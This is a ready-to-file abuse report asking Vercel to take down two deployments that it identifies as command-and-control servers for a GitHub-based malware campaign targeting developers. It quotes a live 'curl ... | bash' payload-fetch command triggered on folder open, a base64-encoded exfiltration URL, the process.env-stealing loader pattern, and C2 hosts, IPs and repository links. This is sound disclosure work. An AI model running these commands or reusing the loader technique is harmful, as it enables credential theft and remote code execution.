# Abuse report — Vercel

**Submission target:** https://vercel.com/help — search "Report abuse" or use https://vercel.com/security/abuse if available; otherwise file a support ticket categorized as *abuse / DMCA / legal*.

**How to use this file**

1. Copy the contents of the **Subject** code block below into the ticket's subject / title field.
2. Copy the contents of the **Body** code block below into the ticket's description field. The body is written as plain text — it reads sensibly even though the support form doesn't render Markdown.

The two C2 hostnames in this report serve **the entire ≥15-repo developer-targeting campaign** described in the companion GitHub abuse report; this filing is by nature cluster-wide, not specific to any single source repository.

(On the rendered GitHub view of this file, hover over each code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version.)

---

## Subject

```text
Two Vercel deployments operating as C2 for an active developer-targeting malware campaign (≥15 GitHub repositories, "Contagious Interview" TTP cluster)
```

## Body

```text
SUMMARY

Two Vercel *.vercel.app deployments are operating as command-and-control servers in an active, currently-live developer-targeting malware campaign. The campaign distributes RCE and credential-theft payloads via at least 15 GitHub repositories across three organizations and several individual accounts; both Vercel hosts are referenced directly from the malicious GitHub repositories and serve the entire cluster, not just a single source repo. A separate abuse report has been filed with GitHub Trust & Safety covering the repository side.


HOSTNAMES AND IPS

Host: vscode-settings-0506.vercel.app
  A records: 64.29.17.195, 216.198.79.195
  Role: stage-1 shell-payload distribution
  Endpoints: /api/settings/mac, /api/settings/linux, /api/settings/windows
  Each endpoint serves an OS-specific shell script that victims invoke via piped curl|bash, wget|sh, or curl|cmd. The pipe is configured by the in-repo .vscode/tasks.json with runOn:folderOpen, so opening one of the malicious repos in VS Code is sufficient to fetch and execute the payload silently.

Host: ip-core-api-one.vercel.app
  A records: 64.29.17.131, 216.198.79.131
  Role: stage-2 Node-loader C2 and process.env exfiltration sink
  Endpoint: POST /api
  When a victim runs "npm install" or "npm start" on one of the malicious repos, the in-repo Express server boots and POSTs the victim's entire process.env (cloud, GitHub, npm, LLM-provider, etc. tokens) to this endpoint, then executes the response body as JavaScript via new Function("require", response.data)(require) -- arbitrary Node RCE as the victim's user. The expected magic header is x-app-request: ip-check.

The two hosts resolve to ADJACENT last-octets in Vercel's edge ({64.29.17,216.198.79}.{131,195}) -- the deployments are on the same Vercel deployment slice and almost certainly the same Vercel account.


EVIDENCE OF MALICIOUS USE -- referenced from malicious GitHub repositories

The two C2 hostnames are referenced directly from the malicious repositories:

- vscode-settings-0506.vercel.app is invoked from .vscode/tasks.json with runOn:folderOpen executing 'curl -L https://vscode-settings-0506.vercel.app/api/settings/mac | bash' and per-OS equivalents. Output is fully suppressed. See:
    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.vscode/tasks.json

- ip-core-api-one.vercel.app is committed in .env as the value of AUTH_API, base64-encoded:
    AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
  which decodes to https://ip-core-api-one.vercel.app/api. The committed code at server/controllers/auth.js and server/routes/api/auth.js then POSTs process.env to this URL and new-Function-executes the response. See:
    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/.env
    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/controllers/auth.js
    https://github.com/AjunaWorkHub/AjunaVerse_MVP/blob/bac3362000a9332a490c763feb847995ea412b46/server/routes/api/auth.js


EVIDENCE THE DEPLOYMENTS ARE OPERATING AS GATED C2 (not benign apps)

When probed from any non-target IP, both hostnames return the identical custom denial:

  HTTP/2 403 Forbidden
  x-deny-reason: host_not_allowed
  content-length: 21
  content-type: text/plain

  Host not in allowlist

This response is returned from every probed path on both hosts (/, /favicon.ico, /robots.txt, /api/health, /admin, /healthz, /api/settings/linux, etc.) and is unaffected by Host: / Referer: / Origin: header spoofing -- the gate is on the CLIENT IP, not the HTTP Host header. Target-IP-allowlist gating is consistent with developer-targeting C2 in which the operator manually registers each victim's home IP before the interview; it is NOT consistent with any benign Vercel application. A benign deployment does not implement custom client-IP allowlisting with a "host_not_allowed" deny header.

Reproducible 30-second probe (returns 403 from any non-target IP):

  $ curl -sS -I -A 'curl/8.7.1' https://vscode-settings-0506.vercel.app/api/settings/mac
  HTTP/2 403
  x-deny-reason: host_not_allowed
  content-length: 21
  content-type: text/plain


KNOWN AFFECTED GITHUB REPOSITORIES (the cluster these C2 hosts serve)

Current-generation repos:
- https://github.com/AjunaWorkHub/AjunaVerse_MVP
- https://github.com/AetSoftWorkHub/AetSoft_MVP
- https://github.com/DLabsHungary-Hub9/DLabs-Platform-MVP2
- https://github.com/roamanbuild/OnyxVerse
- https://github.com/khaleb-dev/jackpot
- https://github.com/rony1235/Jp-Soccer
- https://github.com/mspkteam/williampotter

Earlier-generation repos (same loader at a different file path; some may be on compromised legitimate accounts):
- https://github.com/Andrii-888/0gRollplay
- https://github.com/prahaladbelavadi/CoinLocatorDemo
- https://github.com/sky-cook/tokentradingdapp
- https://github.com/WilliamSuhosky/Property-Voting-DApp
- https://github.com/artemus-jarrett/blockchain-voting-system
- https://github.com/TechByteX/NitroGem
- https://github.com/jamesm-dev/NitroGem
- https://github.com/dappfusion/defi-real-estate
- https://github.com/InvescoHub/defi-real-estate


REQUESTED ACTIONS

1. Take down both deployments immediately: vscode-settings-0506.vercel.app and ip-core-api-one.vercel.app.

2. Identify and suspend the Vercel account hosting them. Given the adjacent IP pairs and the bit-identical .vscode/tasks.json blob across two of the affected GitHub orgs, both deployments are almost certainly on the same Vercel account.

3. Search for sibling deployments under the naming patterns "vscode-settings-*.vercel.app" and "ip-core-api-*.vercel.app" from the same account. The "-0506" suffix is plausibly date-encoded, suggesting prior deployments at other dates; the "-one" suffix suggests "-two", "-three", etc.

4. Preserve account / deployment / access-log records as forensic evidence prior to takedown. The access logs would identify the operator's IPs (used for deployment management), and the request logs would identify the set of victim IPs that have been registered on the allowlist gate.
```

---

## Supporting artifacts (for your reference; do not paste these into the ticket)

- Full technical analysis: [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Companion abuse report to GitHub T&S: [`abuse-report-github.md`](./abuse-report-github.md)
